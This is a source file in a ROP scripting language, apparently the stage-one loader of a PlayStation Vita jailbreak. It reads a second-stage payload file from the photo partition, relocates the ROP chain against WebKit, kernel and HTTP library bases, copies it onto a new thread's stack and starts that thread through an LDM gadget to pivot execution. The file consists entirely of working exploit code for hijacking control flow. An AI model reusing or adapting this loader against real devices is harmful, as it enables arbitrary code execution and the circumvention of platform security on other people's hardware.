#include "common.rop"

data
{
	#include "functions.rop"

	symbol stack_size = 6 * 1024 * 1024;

	variable thread_id = -1;
	variable http_uid = -1;
	variable stack_base = -1; // second thread will pivot here
	variable num_loaded = -1;
	buffer thread_info[0x80];
	buffer download_url[0x200];
	buffer tmp[0x100];
	buffer ldm_buf[7 * 4];

	buffer out_path[256];
	buffer bases[0x10 * 4];
	variable fd = -1;

	// for rop relocation
	variable index = 0;
	variable stored = -1;

	variable memblock = 0;
	variable memblock_base = 0;
	symbol memblock_size = 1024 * 1024;
	variable memblock_code_start = 0;
	variable memblock_data_start = 0;
	variable stack_data_start = 0;

	variable dbg_fd;

	#include "../build/offline/size.rop"
}

code : entry
{
	SceAppMgrUser_291AFBDC_mount(0x64, out_path);
	PRINTF("ret 0x%x mount %s\n", &return, out_path);

	sceKernelCreateThread("st2", ldm_r1_stuff, 0x10000100, stack_size, 0, 0, 0);
	store(&return, thread_id);
	PRINTF("thread %x \n", &return);
	store(0x7C, thread_info);
	sceKernelGetThreadInfo([thread_id], thread_info);
	PRINTF("stack %x  \n", [thread_info + 0x34]);
	// some free space for function calls
	add([thread_info + 0x34], 0x1000);
	store(&return, stack_base);

	// temp memblock to read henkaku.bin to it and relocate in place
	// since we can't sceIoRead straight into another thread's stack
	sceKernelAllocMemBlock("", 0x0c20d060, memblock_size, 0);
	store(&return, memblock);
	PRINTF("alloc 0x%x\n", [memblock]);
	sceKernelGetMemBlockBase([memblock], memblock_base);
	PRINTF("base 0x%x\n", [memblock_base]);

	sceIoOpen("photo0:henkaku.bin", 1);
	store(&return, fd);
	PRINTF("open henkaku.bin: 0x%x\n", [fd]);
	sceIoRead([fd], [memblock_base], memblock_size);
	PRINTF("read: 0x%x\n", &return);
	sceIoClose([fd]);
	PRINTF("close: 0x%x\n", &return);

	// prepare relocation array, same layout as with normal loader, but here relocations are done in rop
	<% i = -1 %>
	#define BASE(x) store(x, bases + <%= i += 1 %> * 4);
	BASE(0);
	add([stack_base], csize);
	BASE(&return);
	BASE(ASLR::SceWebKit+0);
	BASE(ASLR::SceLibKernel+0);
	BASE(ASLR::SceLibc+0);
	BASE(ASLR::SceLibHttp+0);
	BASE(ASLR::SceNet+0);
	BASE(ASLR::SceAppMgr+0);
	#undef BASE

	// relocate the second stage rop
	// basically what we do is:
	//   reloc = relocs[i]
	//   rop[i] += bases[reloc]

	PRINTF("relocating\n");
	relocate_rop(index, 4 * rop_size_words, memblock_base, bases, stored, rop_size_words);
	PRINTF("done relocating\n");

	PRINTF("stored: 0x%x\n", [stored]);

	// copy relocated rop chain in place, first code then data
	PRINTF("copy code\n");
	add([memblock_base], code_start);
	store(&return, memblock_code_start);
	PRINTF("stack_base 0x%x\n", [stack_base]);
	PRINTF("memblock_code_start 0x%x\n", [memblock_code_start]);
	memcpy([stack_base], [memblock_code_start], csize);

	PRINTF("copy data\n");
	add([memblock_base], data_start);
	store(&return, memblock_data_start);
	add([stack_base], csize);
	store(&return, stack_data_start);
	PRINTF("stack_data_start 0x%x\n", [stack_data_start]);
	PRINTF("memblock_data_start 0x%x\n", [memblock_data_start]);
	memcpy([stack_data_start], [memblock_data_start], dsize);

	load([stack_base]);
	PRINTF("first word 0x%x\n", &return);

	PRINTF("prepare LDM args\n");
	// prepare args for LDM gadget
	store([stack_base], ldm_buf+5*4);
	store(pop_pc, ldm_buf+6*4);

	// start second thread
	PRINTF("start stage2 thread!\n");
	sceKernelStartThread([thread_id], 7 * 4, ldm_buf);

	sceKernelWaitThreadEnd([thread_id], 0, 0);

	infloop();
}
